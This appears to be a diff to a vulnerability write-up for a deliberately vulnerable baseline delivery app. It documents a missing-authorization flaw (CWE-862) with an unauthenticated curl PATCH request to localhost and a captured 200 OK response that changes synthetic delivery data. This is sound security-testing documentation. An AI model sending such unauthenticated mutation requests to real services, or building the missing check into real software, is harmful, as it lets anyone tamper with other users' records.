@@ -1,6 +1,6 @@
 # V4: Unauthorised delivery mutation
 
-Baseline reference: baseline-vulnerable
+Baseline reference: baseline-vulnerable (`cb68a377f5b8cdc3b12f86883ac6fb703ef5e405`)
 Primary mapping: CWE-862: Missing Authorization
 
 ## Reproduction request
@@ -20,4 +20,16 @@ curl -i -X PATCH http://localhost:3010/delivery/0000000000000000000000f1/status 
 
 Impact: The status and location mutations identify a delivery by URL id but do not authenticate or verify the assigned driver before saving changes.
 
-This Phase 3 artifact is a reproducible source-level baseline proof. The curl request is the local HTTP reproduction recipe; live response captures are added after the affected local service is started. No live response is claimed by this artifact.
+This Phase 3 artifact is a reproducible source-level baseline proof.
+
+## Live baseline response
+
+Run from the isolated baseline checkout without credentials:
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+{"message":"Delivery status updated successfully","delivery":{"_id":"0000000000000000000000f1","orderID":"0000000000000000000000e1","driverid":"0000000000000000000000a1","status":"DELIVERED"}}
+```
+
+An unauthenticated caller changed the synthetic delivery state. The complete response contained only synthetic fixture data.
